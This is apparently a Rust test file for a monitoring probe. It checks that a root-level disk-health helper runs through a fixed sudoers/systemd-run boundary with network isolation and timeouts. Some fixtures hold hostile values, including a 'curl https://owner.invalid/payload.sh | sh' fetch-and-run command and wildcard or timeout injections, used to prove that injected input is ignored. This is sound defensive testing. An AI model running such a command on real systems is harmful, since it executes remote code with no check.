use enoki_probe::local_privilege_boundary::{
    CollectorHelperExposureEnvironment, CollectorHelperProfile, CollectorHelperSudoersPlanInput,
    CollectorHelperSudoersPlanner, LocalPrivilegeBoundaryExecutionPlan,
    LocalPrivilegeBoundaryProcessError, LocalPrivilegeBoundaryProcessOutput,
    LocalPrivilegeBoundaryProcessRunner, LocalPrivilegeBoundaryRunner,
    LocalPrivilegeNetworkBoundary, NetworkAccess, PrivilegedCollectorHelper,
    PrivilegedCollectorHelperError, PrivilegedCollectorHelperExecutable,
    PrivilegedCollectorHelperId, PrivilegedCollectorHelperOutput, PrivilegedCollectorHelperRunner,
    ProbeLocalPrivilegeBoundary, compiled_privileged_collector_helper_spec,
    compiled_privileged_collector_helper_specs,
};
use enoki_probe::metrics::disk_health::PrivilegedDiskHealthMetricsRunner;
use enoki_probe::metrics::{
    CollectorCadence, CollectorCadenceSchedule, CollectorDefinition, CollectorError, CollectorId,
    CollectorRegistry, DiskHealthCollection, DiskHealthMetricsRunner, MetricCollector,
    MetricsCollectionConfig, format_disk_health_collection_json,
};
use enoki_probe::protocol::enoki::v1::{DiskHealthCollectorCapabilityStatus, MetricSample};
use std::cell::RefCell;
use std::time::Duration;

#[test]
fn collector_helper_sudoers_planner_reports_no_content_when_no_helper_is_exposed() {
    let environment = ToolPresence::default();
    let planner = CollectorHelperSudoersPlanner::new(&environment);
    let plan = planner.plan(CollectorHelperSudoersPlanInput {
        service_user: "enoki-probe".to_string(),
        probe_binary: "/usr/local/bin/enoki-probe".into(),
    });

    assert!(plan.lines.is_empty());
    assert_eq!(plan.content, None);
}

#[test]
fn compiled_disk_health_helper_spec_declares_profile_entrypoint_and_exposure_predicate() {
    let spec =
        compiled_privileged_collector_helper_spec(PrivilegedCollectorHelperId::DiskHealthSmartctl)
            .expect("disk health smartctl helper is compiled");
    let absent_environment = ToolPresence::default();
    let present_environment = ToolPresence {
        paths: vec!["/usr/bin/smartctl".into()],
    };

    assert_eq!(spec.id, PrivilegedCollectorHelperId::DiskHealthSmartctl);
    assert_eq!(
        spec.profile,
        CollectorHelperProfile {
            timeout: Duration::from_secs(10),
            network_access: NetworkAccess::Disabled,
        }
    );
    assert_eq!(
        spec.entrypoint.command,
        "internal-privileged-collector-helper"
    );
    assert_eq!(spec.entrypoint.helper_arg, "disk-health.smartctl");
    assert!(!(spec.exposure_predicate)(&absent_environment));
    assert!((spec.exposure_predicate)(&present_environment));
}

#[test]
fn compiled_helper_specs_own_the_executable_entrypoint_mapping() {
    let specs = compiled_privileged_collector_helper_specs();

    assert!(!specs.is_empty());
    for spec in specs {
        assert_eq!(spec.entrypoint.helper_arg, spec.id.as_internal_arg());
        match spec.id {
            PrivilegedCollectorHelperId::DiskHealthSmartctl => {
                assert_eq!(
                    spec.entrypoint.executable,
                    PrivilegedCollectorHelperExecutable::DiskHealthSmartctl
                );
            }
            _ => panic!(
                "{:?} must not be a compiled helper without an executable",
                spec.id
            ),
        }
    }
}

#[test]
fn collector_helper_sudoers_planner_renders_exact_exposed_helper_command() {
    let environment = ToolPresence {
        paths: vec!["/usr/sbin/smartctl".into()],
    };
    let planner = CollectorHelperSudoersPlanner::new(&environment);
    let plan = planner.plan(CollectorHelperSudoersPlanInput {
        service_user: "enoki-probe".to_string(),
        probe_binary: "/usr/local/bin/enoki-probe".into(),
    });

    assert_eq!(
        plan.lines,
        vec![
            "enoki-probe ALL=(root) NOPASSWD: /usr/bin/systemd-run --quiet --pipe --wait --collect --property=RuntimeMaxSec=10 --property=PrivateNetwork=yes /usr/local/bin/enoki-probe internal-privileged-collector-helper --helper disk-health.smartctl".to_string()
        ]
    );
    assert_eq!(
        plan.content,
        Some("# Managed by Enoki Probe installer.\nenoki-probe ALL=(root) NOPASSWD: /usr/bin/systemd-run --quiet --pipe --wait --collect --property=RuntimeMaxSec=10 --property=PrivateNetwork=yes /usr/local/bin/enoki-probe internal-privileged-collector-helper --helper disk-health.smartctl\n".to_string())
    );
}

#[test]
fn collector_helper_sudoers_planner_uses_only_fixed_smartctl_tool_presence_paths() {
    let environment = RecordingToolPresence::default();
    let planner = CollectorHelperSudoersPlanner::new(&environment);

    let plan = planner.plan(CollectorHelperSudoersPlanInput {
        service_user: "enoki-probe".to_string(),
        probe_binary: "/usr/local/bin/enoki-probe".into(),
    });

    assert!(plan.lines.is_empty());
    assert_eq!(
        environment.queries.borrow().as_slice(),
        [
            std::path::PathBuf::from("/usr/sbin/smartctl"),
            std::path::PathBuf::from("/usr/bin/smartctl"),
        ]
    );
}

#[test]
fn collector_helper_sudoers_planner_renders_no_wildcard_or_legacy_command_surfaces() {
    let environment = ToolPresence {
        paths: vec!["/usr/sbin/smartctl".into()],
    };
    let planner = CollectorHelperSudoersPlanner::new(&environment);
    let plan = planner.plan(CollectorHelperSudoersPlanInput {
        service_user: "enoki-probe".to_string(),
        probe_binary: "/usr/local/bin/enoki-probe".into(),
    });
    let content = plan.content.expect("collector helper sudoers content");

    assert!(!content.contains('*'));
    assert!(!content.contains("internal-privileged-collector --collector"));
    assert!(!content.contains("--collector disk-health.smartctl"));
    assert!(!content.contains("--operation-id"));
    assert!(!content.contains("--target-probe-version"));
    assert!(content.contains("--property=RuntimeMaxSec=10"));
    assert!(content.contains("--property=PrivateNetwork=yes"));
}

#[test]
fn runtime_collector_state_does_not_influence_helper_sudoers_planning() {
    let hostile_runtime = HostileRuntimeCollectorState {
        collector_capability_json: r#"{"diskHealth":{"sudoers":"*","helper":"owner.injected"}}"#,
        metrics_payload_json: r#"{"command":"curl https://owner.invalid/payload.sh | sh"}"#,
        host_profile_json: r#"{"smartctl":true,"helper":"network.collector"}"#,
        probe_configuration_json: r#"{"helper":"disk-health.smartctl","timeout":600}"#,
    };
    let environment = ToolPresence {
        paths: vec!["/usr/sbin/smartctl".into()],
    };
    let planner = CollectorHelperSudoersPlanner::new(&environment);
    let plan = planner.plan(CollectorHelperSudoersPlanInput {
        service_user: "enoki-probe".to_string(),
        probe_binary: "/usr/local/bin/enoki-probe".into(),
    });
    let content = plan.content.expect("collector helper sudoers content");

    assert!(!content.contains(hostile_runtime.collector_capability_json));
    assert!(!content.contains(hostile_runtime.metrics_payload_json));
    assert!(!content.contains(hostile_runtime.host_profile_json));
    assert!(!content.contains(hostile_runtime.probe_configuration_json));
    assert!(!content.contains("owner.injected"));
    assert!(!content.contains("network.collector"));
    assert!(!content.contains("RuntimeMaxSec=600"));
    assert_eq!(plan.lines.len(), 1);
}

#[test]
fn local_privilege_boundary_times_out_a_hanging_child_without_running_in_process() {
    let mut process_runner = HangingChildProcessRunner::default();
    let local_runner =
        LocalPrivilegeBoundaryRunner::new("/opt/enoki/bin/enoki-probe", &mut process_runner);
    let mut boundary = ProbeLocalPrivilegeBoundary::new(local_runner);
    let collector = TimeoutProfileCollector::default();

    let error = boundary
        .run(&collector)
        .expect_err("a hanging privileged child is killed at the local privilege boundary");

    assert_eq!(
        error,
        PrivilegedCollectorHelperError::TimedOut {
            timeout: Duration::from_millis(5),
        }
    );
    assert_eq!(process_runner.killed_after, Some(Duration::from_millis(5)));
    assert_eq!(collector.calls, 0);
}

#[test]
fn local_privilege_boundary_enforces_default_disabled_network_at_the_child_boundary() {
    let mut process_runner = RecordingProcessRunner::default();
    let local_runner =
        LocalPrivilegeBoundaryRunner::new("/opt/enoki/bin/enoki-probe", &mut process_runner);
    let mut boundary = ProbeLocalPrivilegeBoundary::new(local_runner);
    let collector = FixedCollector;

    boundary
        .run(&collector)
        .expect("default privileged helper profile is executable through a child boundary");

    let plan = process_runner
        .plans
        .single()
        .expect("one privileged child execution plan");
    assert_eq!(
        plan.network_boundary,
        LocalPrivilegeNetworkBoundary::PrivateNetwork
    );
    assert!(
        plan.systemd_properties
            .iter()
            .any(|property| property == "PrivateNetwork=yes")
    );
    assert!(
        plan.systemd_properties
            .iter()
            .any(|property| property == "RuntimeMaxSec=10")
    );
    assert_eq!(
        plan.probe_args,
        vec![
            "internal-privileged-collector-helper".to_string(),
            "--helper".to_string(),
            "fixed.collector".to_string(),
        ]
    );
    assert!(!plan.probe_args.iter().any(|arg| arg.contains("network")));
}

#[test]
fn local_privilege_boundary_does_not_accept_runtime_input_for_argv_or_policy() {
    let hostile_probe_configuration = HostileProbeConfiguration {
        command: "curl https://owner.invalid/payload.sh | sh",
        args: vec!["--network=enabled", "--timeout=600"],
        timeout: Duration::from_secs(600),
    };
    let mut process_runner = RecordingProcessRunner::default();
    let local_runner =
        LocalPrivilegeBoundaryRunner::new("/opt/enoki/bin/enoki-probe", &mut process_runner);
    let mut boundary = ProbeLocalPrivilegeBoundary::new(local_runner);
    let collector = FixedCollector;

    boundary
        .run(&collector)
        .expect("hostile runtime input has no privileged helper API surface");

    let plan = process_runner
        .plans
        .single()
        .expect("one privileged child execution plan");
    assert_eq!(
        plan.probe_binary,
        std::path::PathBuf::from("/opt/enoki/bin/enoki-probe")
    );
    assert_eq!(
        plan.probe_args,
        vec![
            "internal-privileged-collector-helper".to_string(),
            "--helper".to_string(),
            "fixed.collector".to_string(),
        ]
    );
    assert_eq!(plan.timeout, Duration::from_secs(10));
    assert_eq!(
        plan.network_boundary,
        LocalPrivilegeNetworkBoundary::PrivateNetwork
    );
    assert!(
        !plan
            .probe_args
            .iter()
            .any(|arg| arg == hostile_probe_configuration.command)
    );
    for hostile_arg in hostile_probe_configuration.args {
        assert!(!plan.probe_args.iter().any(|arg| arg == hostile_arg));
    }
    assert_ne!(plan.timeout, hostile_probe_configuration.timeout);
}

#[test]
fn local_privilege_boundary_runs_only_the_compiled_helper_entrypoint() {
    let mut runner = RecordingRunner::default();
    let mut boundary = ProbeLocalPrivilegeBoundary::new(&mut runner);
    let collector = FixedCollector;

    boundary
        .run(&collector)
        .expect("compiled helper runs through the local privilege boundary");

    assert_eq!(
        runner.invocations,
        vec![RecordedInvocation {
            helper_id: PrivilegedCollectorHelperId::FixedCollector,
            profile: CollectorHelperProfile::default(),
        }]
    );
    assert_eq!(
        runner.invocations[0].profile.network_access,
        NetworkAccess::Disabled
    );
}

trait SinglePlan {
    fn single(self) -> Option<LocalPrivilegeBoundaryExecutionPlan>;
}

impl SinglePlan for Vec<LocalPrivilegeBoundaryExecutionPlan> {
    fn single(mut self) -> Option<LocalPrivilegeBoundaryExecutionPlan> {
        if self.len() == 1 { self.pop() } else { None }
    }
}

#[derive(Default)]
struct RecordingProcessRunner {
    plans: Vec<LocalPrivilegeBoundaryExecutionPlan>,
}

impl LocalPrivilegeBoundaryProcessRunner for RecordingProcessRunner {
    fn run(
        &mut self,
        plan: &LocalPrivilegeBoundaryExecutionPlan,
    ) -> Result<LocalPrivilegeBoundaryProcessOutput, LocalPrivilegeBoundaryProcessError> {
        self.plans.push(plan.clone());
        Ok(LocalPrivilegeBoundaryProcessOutput::default())
    }
}

#[test]
fn local_privilege_boundary_timeout_marks_the_collector_run_failed() {
    let mut runner = TimeoutRunner;
    let mut boundary = ProbeLocalPrivilegeBoundary::new(&mut runner);
    let collector = TimeoutProfileCollector::default();

    let error = boundary
        .run(&collector)
        .expect_err("timed out privileged collector helper is reported as a collector failure");

    assert_eq!(
        error,
        PrivilegedCollectorHelperError::TimedOut {
            timeout: Duration::from_millis(5),
        }
    );
    assert_eq!(collector.calls, 0);
}

#[test]
fn local_privilege_boundary_network_access_is_a_helper_profile_decision() {
    let mut runner = RecordingRunner::default();
    let mut boundary = ProbeLocalPrivilegeBoundary::new(&mut runner);
    let collector = NetworkEnabledCollector::default();

    boundary
        .run(&collector)
        .expect("source-level collector profile can opt into network access");

    assert_eq!(
        runner.invocations,
        vec![RecordedInvocation {
            helper_id: PrivilegedCollectorHelperId::NetworkEnabledCollector,
            profile: CollectorHelperProfile {
                timeout: Duration::from_secs(2),
                network_access: NetworkAccess::Enabled,
            },
        }]
    );
    assert_eq!(collector.calls, 0);
}

#[test]
fn disk_health_smartctl_declares_disabled_network_and_timeout_boundary() {
    let mut runner = DiskHealthRecordingRunner::default();
    let mut disk_health_runner = PrivilegedDiskHealthMetricsRunner::new_with_exposure_environment(
        &mut runner,
        ToolPresence {
            paths: vec!["/usr/bin/smartctl".into()],
        },
    );

    let collection = disk_health_runner
        .collect_disk_health_metrics()
        .expect("empty privileged disk health output is valid");

    assert!(collection.metrics.is_empty());
    assert_eq!(
        runner.invocations,
        vec![RecordedInvocation {
            helper_id: PrivilegedCollectorHelperId::DiskHealthSmartctl,
            profile: CollectorHelperProfile {
                timeout: Duration::from_secs(10),
                network_access: NetworkAccess::Disabled,
            },
        }]
    );
}

#[test]
fn disk_health_unsupported_smart_status_crosses_the_helper_boundary() {
    let mut runner = DiskHealthRecordingRunner {
        stdout: format_disk_health_collection_json(&DiskHealthCollection::unavailable(
            DiskHealthCollectorCapabilityStatus::UnsupportedSmartData,
            "SMART data is unsupported for scanned devices",
        )),
        ..DiskHealthRecordingRunner::default()
    };
    let mut disk_health_runner = PrivilegedDiskHealthMetricsRunner::new_with_exposure_environment(
        &mut runner,
        ToolPresence {
            paths: vec!["/usr/bin/smartctl".into()],
        },
    );

    let collection = disk_health_runner
        .collect_disk_health_metrics()
        .expect("typed unavailable disk health output crosses helper boundary");

    assert!(collection.metrics.is_empty());
    assert_eq!(
        collection.status,
        DiskHealthCollectorCapabilityStatus::UnsupportedSmartData
    );
    assert_eq!(
        collection.diagnostic,
        "SMART data is unsupported for scanned devices"
    );
}

#[test]
fn disk_health_missing_smartctl_does_not_invoke_the_helper_boundary() {
    let mut runner = DiskHealthRecordingRunner {
        error: Some(
            PrivilegedCollectorHelperError::local_privilege_boundary_unavailable(
                "sudo rejected privileged helper execution",
            ),
        ),
        ..DiskHealthRecordingRunner::default()
    };
    let mut disk_health_runner = PrivilegedDiskHealthMetricsRunner::new_with_exposure_environment(
        &mut runner,
        ToolPresence::default(),
    );

    let error = disk_health_runner
        .collect_disk_health_metrics()
        .expect_err("missing smartctl is reported before helper execution");

    assert_eq!(
        error.status,
        DiskHealthCollectorCapabilityStatus::MissingSmartctl
    );
    assert_eq!(error.diagnostic, "smartctl is not installed");
    assert!(runner.invocations.is_empty());
}

#[test]
fn local_privilege_boundary_failures_are_isolated_as_collector_failures() {
    let mut registry = CollectorRegistry::from_collectors(vec![
        Box::new(PrivilegedMetricCollector {
            local_privilege_boundary: ProbeLocalPrivilegeBoundary::new(FailingRunner),
            collector: FixedCollector,
        }),
        Box::new(MemoryMetricCollector),
    ]);

    let sample = registry
        .collect_due(
            9,
            Duration::from_secs(5),
            CollectorCadenceSchedule::new(Duration::from_secs(5)),
            &MetricsCollectionConfig::all_enabled(),
        )
        .expect("successful collector still emits after privileged helper failure");

    assert_eq!(sample.sequence, 9);
    assert_eq!(sample.cpu_percent, None);
    assert_eq!(sample.memory_used_bytes, Some(2048));
}

struct HostileProbeConfiguration {
    command: &'static str,
    args: Vec<&'static str>,
    timeout: Duration,
}

struct HostileRuntimeCollectorState {
    collector_capability_json: &'static str,
    metrics_payload_json: &'static str,
    host_profile_json: &'static str,
    probe_configuration_json: &'static str,
}

#[derive(Default)]
struct ToolPresence {
    paths: Vec<std::path::PathBuf>,
}

impl CollectorHelperExposureEnvironment for ToolPresence {
    fn tool_exists(&self, path: &std::path::Path) -> bool {
        self.paths.iter().any(|present| present == path)
    }
}

#[derive(Default)]
struct RecordingToolPresence {
    queries: RefCell<Vec<std::path::PathBuf>>,
}

impl CollectorHelperExposureEnvironment for RecordingToolPresence {
    fn tool_exists(&self, path: &std::path::Path) -> bool {
        self.queries.borrow_mut().push(path.to_path_buf());
        false
    }
}

struct FixedCollector;

impl PrivilegedCollectorHelper for FixedCollector {
    fn helper_id(&self) -> PrivilegedCollectorHelperId {
        PrivilegedCollectorHelperId::FixedCollector
    }
}

#[derive(Default)]
struct TimeoutProfileCollector {
    calls: u32,
}

impl PrivilegedCollectorHelper for TimeoutProfileCollector {
    fn helper_id(&self) -> PrivilegedCollectorHelperId {
        PrivilegedCollectorHelperId::TimeoutCollector
    }

    fn helper_profile(&self) -> &'static CollectorHelperProfile {
        static PROFILE: CollectorHelperProfile = CollectorHelperProfile {
            timeout: Duration::from_millis(5),
            network_access: NetworkAccess::Disabled,
        };

        &PROFILE
    }
}

#[derive(Default)]
struct NetworkEnabledCollector {
    calls: u32,
}

impl PrivilegedCollectorHelper for NetworkEnabledCollector {
    fn helper_id(&self) -> PrivilegedCollectorHelperId {
        PrivilegedCollectorHelperId::NetworkEnabledCollector
    }

    fn helper_profile(&self) -> &'static CollectorHelperProfile {
        static PROFILE: CollectorHelperProfile = CollectorHelperProfile {
            timeout: Duration::from_secs(2),
            network_access: NetworkAccess::Enabled,
        };

        &PROFILE
    }
}

#[derive(Debug, Eq, PartialEq)]
struct RecordedInvocation {
    helper_id: PrivilegedCollectorHelperId,
    profile: CollectorHelperProfile,
}

struct DiskHealthRecordingRunner {
    invocations: Vec<RecordedInvocation>,
    stdout: String,
    error: Option<PrivilegedCollectorHelperError>,
}

impl Default for DiskHealthRecordingRunner {
    fn default() -> Self {
        Self {
            invocations: Vec::new(),
            stdout: "[]".to_string(),
            error: None,
        }
    }
}

impl PrivilegedCollectorHelperRunner for DiskHealthRecordingRunner {
    fn run(
        &mut self,
        invocation: enoki_probe::local_privilege_boundary::PrivilegedCollectorHelperInvocation,
    ) -> Result<PrivilegedCollectorHelperOutput, PrivilegedCollectorHelperError> {
        self.invocations.push(RecordedInvocation {
            helper_id: invocation.helper_id,
            profile: invocation.profile,
        });
        if let Some(error) = self.error.clone() {
            return Err(error);
        }
        Ok(PrivilegedCollectorHelperOutput {
            stdout: self.stdout.clone(),
        })
    }
}

#[derive(Default)]
struct RecordingRunner {
    invocations: Vec<RecordedInvocation>,
}

impl PrivilegedCollectorHelperRunner for RecordingRunner {
    fn run(
        &mut self,
        invocation: enoki_probe::local_privilege_boundary::PrivilegedCollectorHelperInvocation,
    ) -> Result<PrivilegedCollectorHelperOutput, PrivilegedCollectorHelperError> {
        self.invocations.push(RecordedInvocation {
            helper_id: invocation.helper_id,
            profile: invocation.profile,
        });
        Ok(PrivilegedCollectorHelperOutput::default())
    }
}

struct TimeoutRunner;

impl PrivilegedCollectorHelperRunner for TimeoutRunner {
    fn run(
        &mut self,
        invocation: enoki_probe::local_privilege_boundary::PrivilegedCollectorHelperInvocation,
    ) -> Result<PrivilegedCollectorHelperOutput, PrivilegedCollectorHelperError> {
        Err(PrivilegedCollectorHelperError::TimedOut {
            timeout: invocation.profile.timeout,
        })
    }
}

struct FailingRunner;

impl PrivilegedCollectorHelperRunner for FailingRunner {
    fn run(
        &mut self,
        _invocation: enoki_probe::local_privilege_boundary::PrivilegedCollectorHelperInvocation,
    ) -> Result<PrivilegedCollectorHelperOutput, PrivilegedCollectorHelperError> {
        Err(PrivilegedCollectorHelperError::collector_failed(
            "privileged collector helper failed",
        ))
    }
}

struct PrivilegedMetricCollector<R, C> {
    local_privilege_boundary: ProbeLocalPrivilegeBoundary<R>,
    collector: C,
}

impl<R, C> MetricCollector for PrivilegedMetricCollector<R, C>
where
    R: PrivilegedCollectorHelperRunner,
    C: PrivilegedCollectorHelper,
{
    fn definition(&self) -> CollectorDefinition {
        CollectorDefinition::new(CollectorId::Cpu, CollectorCadence::EveryTick)
    }

    fn collect(&mut self, sample: &mut MetricSample) -> Result<bool, CollectorError> {
        self.local_privilege_boundary
            .run(&self.collector)
            .map_err(|error| CollectorError::new(format!("{error:?}")))?;
        sample.cpu_percent = Some(90.0);
        Ok(true)
    }
}

#[derive(Default)]
struct HangingChildProcessRunner {
    killed_after: Option<Duration>,
}

impl LocalPrivilegeBoundaryProcessRunner for HangingChildProcessRunner {
    fn run(
        &mut self,
        plan: &LocalPrivilegeBoundaryExecutionPlan,
    ) -> Result<LocalPrivilegeBoundaryProcessOutput, LocalPrivilegeBoundaryProcessError> {
        self.killed_after = Some(plan.timeout);
        Err(LocalPrivilegeBoundaryProcessError::TimedOut {
            timeout: plan.timeout,
        })
    }
}

struct MemoryMetricCollector;

impl MetricCollector for MemoryMetricCollector {
    fn definition(&self) -> CollectorDefinition {
        CollectorDefinition::new(CollectorId::Memory, CollectorCadence::EveryTick)
    }

    fn collect(&mut self, sample: &mut MetricSample) -> Result<bool, CollectorError> {
        sample.memory_used_bytes = Some(2048);
        Ok(true)
    }
}
